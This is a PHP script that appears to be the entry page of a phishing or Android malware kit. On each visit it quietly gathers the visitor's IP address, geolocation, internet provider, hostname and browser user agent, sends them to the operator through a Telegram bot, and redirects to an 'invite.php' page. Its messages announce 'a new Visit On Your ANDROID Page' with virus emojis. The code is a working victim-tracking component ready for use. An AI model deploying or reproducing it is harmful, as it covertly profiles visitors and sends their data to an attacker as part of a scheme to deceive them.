<?php

error_reporting(0);
$ip = getenv("REMOTE_ADDR");
$url = "http://ip-api.com/json/" . $ip;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$resp = curl_exec($ch);
curl_close($ch);
$details = json_decode($resp, true);
$countryname = $details['country'];
$city = $details['city'];
$isp = $details['isp'];
$region = $details['regionName'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];


$message .= " Wassup 📲, You have a new Visit On Your ANDROID Page 🦠🦠🦠   \n"."\n";
$message.= "IP Address:$ip"."\n";
$message.= "COUNTRY:$countryname"."\n";
$message.= "REGION:{$region}"."\n";
$message.= "ORGANISATION:{$isp}"."\n";
$message.= "HOSTNAME:" . $hostname . ""."\n";
$message.= "USER AGENT:{$_SERVER['HTTP_USER_AGENT']}"."\n"."\n";

$settings = include 'settings.php';
if ($settings['telegram'] == "1"){
  $data = $message;
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/{$settings['bot_url']}";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
}
		header("Location: invite.php");
	
?>
